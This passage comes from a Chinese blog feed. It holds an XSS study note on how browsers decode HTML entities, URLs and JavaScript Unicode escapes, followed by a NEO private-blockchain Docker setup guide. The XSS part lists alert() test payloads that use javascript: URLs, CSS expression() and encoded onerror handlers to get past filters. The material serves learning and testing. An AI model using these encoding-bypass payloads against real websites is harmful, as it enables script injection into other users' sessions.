class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image: url(javascript:alert('xss'))"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- IE低版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:expression(alert(1));"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:expression\028 alert \028 1 \029 \029;"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="URL解析"><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h2><p>我们都知道浏览器发送到服务器时，服务器会对url进行一次URL解析然后处理。</p><p>那么浏览器中也会进行对于URL的解析。<br>比如html中的<code>&lt;a&gt;</code>标签的<code>href</code>属性，url解析器会对href内部的内容进行一次url解析<br>js中的<code>window.open()</code>,url解析器会对括号内部的内容进行一次url解析</p><p>URL解析过程中的一个细节了，不能对伪协议类型进行任何的编码操作，否则URL解析器会认为它无类型。<br>这个协议类型的格式是<code>javascript:</code>不是只是<code>javascript</code></p><p>除此了<code>javascript:</code>伪协议可以执行js代码之外，还有IE下的<code>vbscript</code>,Mozilla下的<code>dataURL</code>(data:text/html;这里可以直接添加html的<code>&lt;script&gt;标签，会执行</code>)</p><h2 id="unicode编码-javascript解析器"><a href="#unicode编码-javascript解析器" class="headerlink" title="unicode编码 javascript解析器"></a>unicode编码 javascript解析器</h2><p>说明一些javascript解析器的入口：</p><ul><li><code>&lt;script&gt;</code>标签</li><li><code>onlick</code>等事件js的动作</li><li>url调用<code>javascript:</code>伪协议</li><li><code>css</code>调用引入文件，或url再间接引入javascript:</li><li><code>eval()</code>调用</li><li>定时器触发</li></ul><p><strong>Unicode转义序列</strong>：<code>&quot;\uXXXX&quot;</code>，表示一个字符，其中xxxx表示一个16进制数字，如 “&lt;” Unicode编码为 “\u003c”。</p><blockquote><p>js编码还有一种普通十六进制 \xAA</p></blockquote><p>Unicode转义序列出现的地方。从上下文来看，可以分为三个地方：字符串中，标识符名称中和控制字符中。</p><ul><li>字符串中：转义序列只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。</li><li>标识符名称中：转义序列会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。</li><li>控制字符中：转义序列将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。</li></ul><p>JavaScript解析时只有<strong>标识符名称</strong>不会被当做字符串，<strong>控制字符</strong>仅会被解析为标示符名称或者字符串</p><p>Javascript解析器工作的时候可以将<code>\u0061\u006c\u0065\u0072\u0074</code>进行js解码后为“alert”，而“alert”是一个有效的标识符名称，它是能被正常解析的。像圆括号、双引号、单引号等等这些控制字符，在进行JavaScript解析的时候仅会被解码为字符串文本或者上面讲的标识符名称，不能作为控制字符解析。</p><p>所以unicode解码后的字符串，不能截断语句，不能有控制语法的功能，只能作为字符串，或标识符。</p><p>即，在绕过时，能编码的部分，不能包括控制符号如<code>(</code>,<code>)</code>,<code>;</code>,<code>&quot;</code>,<code>&#39;</code>等。解码后只作为字符串，或标识符名称处理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"alert(1);\u0061lert(2)"</span>&gt;</span>test0<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"alert(1)\u003b\u0061lert(2)"</span>&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test0 可以弹框两个。test1不弹框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(\u0031)"</span>)&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('\u0031')"</span>)&gt;</span>test2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(1)"</span>)&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"</span>)&gt;</span>test4<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)"</span>)&gt;</span>test5<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript\u003aalert(1)"</span>)&gt;</span>test6<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('1\u000a')"</span>)&gt;</span>test7<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">测试</th><th style="text-align:center">结果 </th></tr></thead><tbody><tr><td style="text-align:center">test</td><td style="text-align:center">弹框</td></tr><tr><td style="text-align:center">test1</td><td style="text-align:center">失败，解析为字符串1，需要单引号</td></tr><tr><td style="text-align:center">test2</td><td style="text-align:center">弹框，编码<code>&#39;</code>则失败</td></tr><tr><td style="text-align:center">test3</td><td style="text-align:center">弹框</td></tr><tr><td style="text-align:center">test4</td><td style="text-align:center">失败，编码括号</td></tr><tr><td style="text-align:center">test5</td><td style="text-align:center">失败，URL解码时，不以javascript伪协议解析，寻找根目录下链接</td></tr><tr><td style="text-align:center">test6</td><td style="text-align:center">失败，同上，寻找相对路径链接</td></tr><tr><td style="text-align:center">test7</td><td style="text-align:center">弹框，可以添加换行符，不受印象。\u000a 换行符</td></tr></tbody></table><h2 id="判断解析流程-url"><a href="#判断解析流程-url" class="headerlink" title="判断解析流程 url"></a>判断解析流程 url</h2><p>上面分别提了三种编码，然后把URL解码，跟js解码结合在一起举了个例子。<br>可以尝试判断以下html代码再浏览器中的解析流程</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"window.open('value1')"</span> <span class="attr">href</span>=<span class="string">"javascript:window.open(value2)"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Value1：HTML解码 -&gt; JavaScript解码 -&gt; URL解码<br>Value2：HTML解码 -&gt; URL解码 -&gt; JavaScript解码 -&gt; URL解码</p><p>对value1进行细节分析：</p><ul><li>HTML解码：因为a标签可以顺利生成DOM树，对<code>window.open(&#39;value1&#39;)</code>和<code>javascript:window,open(value2)</code>进行HTML解码</li><li>JavaScript解码：因为onclick属性，对其中内容进行JS unicode解码<code>window.open(&#39;value1&#39;)</code></li><li>URL解码：window.open打开一个url，对其中内容进行url解码<code>value1</code></li></ul><p>尝试判断value1最严格编码：</p><ul><li>URL编码：<code>value1</code>。只能对value1，不能对<code>&#39;value1&#39;</code></li><li>JS编码：<code>window</code>,<code>open</code>,<code>%76%61%6c%75%65%31</code>。不能对<code>.</code>,<code>(</code>,<code>)</code>,<code>&#39;</code>编码</li><li>html实体编码：全部。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 未编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"window.open('value1')"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- URL编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"window.open('%76%61%6c%75%65%31')"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 继续js编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"\u0077\u0069\u006e\u0064\u006f\u0077.\u006f\u0070\u0065\u006e('\u0025\u0037\u0036\u0025\u0036\u0031\u0025\u0036\u0063\u0025\u0037\u0035\u0025\u0036\u0035\u0025\u0033\u0031')"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 继续全部html实体编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x37;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x39;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x65;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x34;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x66;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x37;&amp;#x2E;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x66;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x30;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x65;&amp;#x28;&amp;#x27;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x37;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x31;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x33;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x37;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x33;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x31;&amp;#x27;&amp;#x29;"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>value2 也是差不多意思了。</p><h2 id="判断解析流程-DOM"><a href="#判断解析流程-DOM" class="headerlink" title="判断解析流程 DOM"></a>判断解析流程 DOM</h2><p>基于DOM的解析流程 也会有所不同。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"1"</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"1"</span>).innerHTML = <span class="string">"&lt;img src=&amp;#35; on\u0065rror=&amp;#97;lert&amp;#40;1)&gt;"</span>;  </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解析过程：JS解析 -&gt; html解析 </p><ul><li>js解析：进入script标签时，进行一个js解析。还原了onerror</li><li>html解析：DOM修改完html标签后，会重新建立DOM树，对其中节点重新html实体编码解析</li></ul><hr><h1 id="自测"><a href="#自测" class="headerlink" title="自测"></a>自测</h1><p>如果做出了以下题目，应该可以说是掌握了。<br><a href="http://test.attacker-domain.com/browserparsing/tests.html" target="_blank" rel="noopener">题目</a><br><a href="http://test.attacker-domain.com/browserparsing/answers.txt" target="_blank" rel="noopener">答案</a></p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>html 在生成DOM树时不会html实体编码解码<code>&lt;script&gt;</code>标签中的内容</li><li>如果<code>&lt;script&gt;</code>标签修改了DOM树，会对其中的节点内容进行html实体编码解析</li><li>js编码 对控制符无效，对字符串有效</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/slly/p/6640761.html" target="_blank" rel="noopener">https://www.cnblogs.com/slly/p/6640761.html</a><br><a href="https://www.cnblogs.com/yanglang/p/7090120.html" target="_blank" rel="noopener">https://www.cnblogs.com/yanglang/p/7090120.html</a><br><a href="https://segmentfault.com/a/1190000009975744" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009975744</a><br><a href="https://www.jianshu.com/p/cfdf1747d30e" target="_blank" rel="noopener">https://www.jianshu.com/p/cfdf1747d30e</a><br><a href="https://blog.csdn.net/qq_35513598/article/details/79861908" target="_blank" rel="noopener">https://blog.csdn.net/qq_35513598/article/details/79861908</a><br><a href="https://security.yirendai.com/news/share/26" target="_blank" rel="noopener">https://security.yirendai.com/news/share/26</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 被怼番之后，好好学习基础原理 —&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://lalajun.com/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="浏览器" scheme="http://lalajun.com/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
      <category term="xss" scheme="http://lalajun.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>NEO-搭建私有链</title>
    <link href="http://lalajun.com/2018/08/15/NEO-%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/"/>
    <id>http://lalajun.com/2018/08/15/NEO-搭建私有链/</id>
    <published>2018-08-15T09:05:28.000Z</published>
    <updated>2018-09-07T11:52:49.075Z</updated>
    
    <content type="html"><![CDATA[<p>— cityofzion大法好 —</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>因为测试链不给GAS…只能自己搭建私有链。</p><p>关于NEO私有链的搭建，官网有教程，NEL有教程，毫无疑问，这些教程都很详细，很深入，很透彻……很麻烦…..<br>感觉搭建一个私有链，就是已经要了解整个区块链的机制哎，难道不是先给个实验的地方，然后一步步慢慢去了解么，都感觉本末倒置了。</p><p>没有链 -&gt; 雾里看花 -&gt; 测试链不给币 -&gt; 搭建私有链 -&gt; 超多麻烦 -&gt; 还是没有链 = 劝退</p><p>然后cityofzion的看上去最简单的拿着试了下。<br>cityofzion大法好！本以为会是一如既往艰难险阻疑无路的大坑，没想到！真的几步就好了！哇，这个社区太给力了<br>好好学习英语！</p><p><a href="https://hub.docker.com/r/cityofzion/neo-privatenet/" target="_blank" rel="noopener">docker镜像及说明</a><br><a href="https://github.com/CityOfZion/neo-privatenet-docker" target="_blank" rel="noopener">CityOfZion通过docker搭建NEO私有链</a></p><p>– 09.07 更新 –<br>重新更新，因为COZ的私有链 使用的不是最新版本的cli。<br>个人需要使用最近版本来验证一个漏洞，重新开始弄一个最新版本的私有链。<br>根据 官方的docker镜像 来构建私有链，稍微会麻烦一点，但是镜像会持续拉取最新版本的cli。</p><h1 id="基于CityOfZion的docker私有链"><a href="#基于CityOfZion的docker私有链" class="headerlink" title="基于CityOfZion的docker私有链"></a>基于CityOfZion的docker私有链</h1><p>可以只起neo私有链，还可以起配合neoscan的neo私有链。后者看后面的补充，可一步到位。</p><h2 id="两步搭建"><a href="#两步搭建" class="headerlink" title="两步搭建"></a>两步搭建</h2><hr><blockquote><p>前提 装好docker，会使用docker</p></blockquote><p>1.下载镜像<br><code>docker pull cityofzion/neo-privatenet</code><br>2.运行镜像<br><code>docker run --rm -d --name neo-privatenet -p 20333-20336:20333-20336/tcp -p 30333-30336:30333-30336/tcp cityofzion/neo-privatenet</code></p><h2 id="两步配置neo-gui"><a href="#两步配置neo-gui" class="headerlink" title="两步配置neo-gui"></a>两步配置neo-gui</h2><hr><blockquote><p>为了不出错，新下载一个neo-gui客户端来链接测试链，因为改测试链上的 需要删区块，没必要</p></blockquote><p>1.拷贝<a href="https://github.com/CityOfZion/neo-privatenet-docker/blob/master/configs/protocol.json" target="_blank" rel="noopener">protocol.json</a>到新neo-gui目录下<br>2.拷贝<a href="https://github.com/CityOfZion/neo-privatenet-docker/blob/master/configs/config-windows.json" target="_blank" rel="noopener">config.json</a>到新neo-gui目录下 </p><blockquote><p>如果docker不是在本机运行，而是在虚拟机或其他服务器上运行，修改以上两个配置文件中的 127.0.0.1/localhost 为 对应虚拟机IP地址</p></blockquote><p>启动 neo-gui 等待同步完成</p><h2 id="两步确认运行"><a href="#两步确认运行" class="headerlink" title="两步确认运行"></a>两步确认运行</h2><hr><p>如果不放心可以去确认区块的生成</p><p><code>docker exec -it neo-privatenet /bin/bash</code><br><code>screen -d -r node1</code></p><h2 id="一步有钱"><a href="#一步有钱" class="headerlink" title="一步有钱"></a>一步有钱</h2><hr><p>neo-gui中右键-导入-导入WIF-<code>KxDgvEKzgSBPPfuVfw67oPQBSjidEiqTHURKSDL1R7yGaGYAeYnr</code></p><p>搞定</p><h2 id="远程调用rpc"><a href="#远程调用rpc" class="headerlink" title="远程调用rpc"></a>远程调用rpc</h2><hr><p>远程调用rpc 就是利用neo-cli读取链上信息，以上操作已经开放远程调用。</p><p>私有链的远程调用端口是：<code>30333-30336</code></p><p>官网说明：<a href="http://docs.neo.org/zh-cn/node/cli/2.7.6/api.html" target="_blank" rel="noopener">这里</a></p><p>使用方法：<br>GET:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://somewebsite.com:10332?jsonrpc=2.0&amp;method=getblockcount&amp;params=[]&amp;id=1</span><br></pre></td></tr></table></figure></p><p>POST:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://somewebsite.com:10332</span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;getblockcount&quot;,</span><br><span class="line">  &quot;params&quot;: [],</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><hr><p>接下来就是neo-gui的操作了，转到自己的账号上啦巴拉巴拉，有了测试链才能开始学习啊喂。</p><p>OKOK，收工</p><hr><h2 id="补充cli-rpc-开启–log选项说明"><a href="#补充cli-rpc-开启–log选项说明" class="headerlink" title="补充cli rpc 开启–log选项说明"></a>补充cli rpc 开启–log选项说明</h2><p><hr><br>使用cli rpc 只要有能发包的工具就行，但是理所当然的没有找到很好的浏览器插件，就用burpsuite了<br>通常的api都是可以调用的，<a href="http://docs.neo.org/zh-cn/node/cli/2.7.6/api.html" target="_blank" rel="noopener">api查看</a></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fubnqwbhktj30ra09vjt3.jpg" alt="22.png"></p><p>好吧，但是我调用这个就是为了查看notify输出信息。<br>之后调用 cli rpc 查看智能合约notify的时候发现，getapplicationlog api是不行的</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fubnqrjzd4j30rc09x755.jpg" alt="11.png"></p><p>感觉应该是两步起来的私有链里面的cli并没有开<code>--log</code>功能。（之后尝试修改的时候发现确实是这样）<br>那么接下来就去私链里面开–log,操作就是——<strong>进入docker-关掉neo cli-修改-重开</strong></p><blockquote><p>此处还有另一个操作，就是再起一个cli节点，修改配置文件，开log连接至私有链，就不必去动docker</p></blockquote><p>进入docker：</p><ul><li><code>docker exec -it neo-privatenet /bin/bash</code></li></ul><p><strong>关掉</strong>：</p><ul><li><code>screen -ls</code>：查看4个命令行正在运行四个共识节点neo-cli</li><li><code>screen -d -r node1</code>：进入这个命令行</li><li><code>ctrl + c</code>：终止这个进程</li><li>相同的重复四次 终止 node1 到 node4 每一个终止完需要等一会，会自动回到原来命令行</li></ul><p><strong>修改</strong>：</p><ul><li><code>vi /opt/start_consensus_node.sh</code>:修改已有的脚本</li><li><code>spawn dotnet neo-cli.dll --rpc</code> -&gt; <code>spawn dotnet neo-cli.dll --rpc --log</code></li><li><code>:wq</code>保存</li></ul><p><strong>重开</strong>：</p><ul><li><code>cd /opt</code>：移动目录</li><li><code>./run.sh</code>：执行已有的脚本，这个脚本调用了我们刚才改的脚本</li><li>一段时间之后ctrl+c终止脚本，另外四个进程其实已经在后台运行了</li></ul><p><strong>检查</strong>：看自己gui会不会更新，或者前文提到的检查docker内部</p><p><strong>提醒</strong>：记得等上链之后再调用rpc，不然还是会一样的不行</p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fubnqzkg7yj30qn081my9.jpg" alt="33.png"></p><h2 id="补充加上neonscan"><a href="#补充加上neonscan" class="headerlink" title="补充加上neonscan"></a>补充加上neonscan</h2><p>因为要使用neon.js，需要有数据库层面对外的接口按照教程重新加了下。<br><a href="https://github.com/slipo/neo-scan-docker" target="_blank" rel="noopener">教程</a></p><p>需要停掉之前的<code>cityofzion/neo-privatenet</code>镜像<br><code>docker stop 对应的容器id</code></p><p>自动起环境<br><code>git clone git@github.com:slipo/neo-scan-docker.git</code><br><code>cd neo-scan-docker</code><br><code>docker-compose up</code>：这个地方会自动进入neon-scan的页面，等到同步速度变慢，就是在正常出块了，然后放着不管就好了</p><p>修改host文件<br><code>vi /etc/host</code>：我的是在这里<br><code>127.0.0.1 neo-privnet</code>：添加这一行，必须修改，neonscan到neon私有链是通过这个<code>neo-privnet</code>域名链接的，具体可以看dockerfile</p><p>其实直接用这个这个还更方便更全面emm<br>如果是从一开始私有链过来的，私有链的所有块都可以直接继承，账号也是，之前设置的 neo-gui 可以直接用</p><p>但是需要cli rpc 开启–log选项的话，需要按照之前的操作重复一次，并且之前的log也都会不见</p><blockquote><p>私有链搭建在另一台服务器中时，把 <code>服务器ip neo-privnet</code> 写到自己本机的host中 可以避免使用neon.js的一个坑</p></blockquote><blockquote><p>发现scan 有时候会莫名崩溃，不是特别的理解。但是重启就可以解决，进入拥有compose文件的neo-scan-docker目录<code>cd neo-scan-docker</code>。<code>docker-compose restart neo-scan</code>即可</p></blockquote><h2 id="崩溃处理"><a href="#崩溃处理" class="headerlink" title="崩溃处理"></a>崩溃处理</h2><p>2018/09/04更新。</p><p>今天用着用着私链崩溃，无法同步，也无法生成区块了。在写代码，不想再花精力去弄，直接删掉镜像和数据，重启了一个私有链。</p><p>结果发现有一个节点莫名其妙的开始区块超前。简直无法理解啊。但是三个节点仍然可以生成区块的，也没考虑那么多。</p><p>使用neon.js从neoscan读取节点广播交易的时候发现，一直都广播失败，很绝望。最后发现，选取节点广播交易时，都会使用区块高度最高的那个节点，去广播交易。</p><p>就是一直在使用坏掉的那个节点。所以一直广播失败。直接把那个节点关了即可。</p><p>个人感觉应该是docker镜像数据残留的问题？但是处理好了，万幸。</p><h1 id="基于官方docker镜像起私有链"><a href="#基于官方docker镜像起私有链" class="headerlink" title="基于官方docker镜像起私有链"></a>基于官方docker镜像起私有链</h1><p><a href="https://github.com/NewEconoLab/Docs/blob/master/study/DevOps/DockerNeoPrivatenet.md" target="_blank" rel="noopener">官方教程</a></p><p>讲的还是比较清楚的，没必要多余说明，但是有一些坑啊。</p><h2 id="无法启动neo-cli"><a href="#无法启动neo-cli" class="headerlink" title="无法启动neo-cli"></a>无法启动neo-cli</h2><p>当<code>donet neo-cli.dll /rpc</code>的时候</p><p><img src alt="坑0.png"></p><p>是官方配置文件有问题</p><p><img src alt="坑1.png"></p><p>感觉是老版本的cli配置文件。需要修改为右边的<code>ApplicationLogs</code>,就可以启动</p><p><img src alt="坑3.png"></p><h2 id="私有链端口映射有问题"><a href="#私有链端口映射有问题" class="headerlink" title="私有链端口映射有问题"></a>私有链端口映射有问题</h2><p><img src alt="坑4.png"></p><p>以上是通过官方镜像compose产生的4个镜像<br>端口映射：</p><ul><li>cli0 10331-10334 -&gt; 10331-10334</li><li>cli1 20331-20334 -&gt; 10331-10334</li><li>cli2 30331-30334 -&gt; 10331-10334</li><li>cli3 40331-40334 -&gt; 10331-10334</li></ul><p>实际上一个 cli容器 只会映射出一个端口</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— cityofzion大法好 —&lt;/p&gt;
    
    </summary>
    
    
      <category term="NEO" scheme="http://lalajun.com/tags/NEO/"/>
    
      <category term="区块链" scheme="http://lalajun.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
</feed>
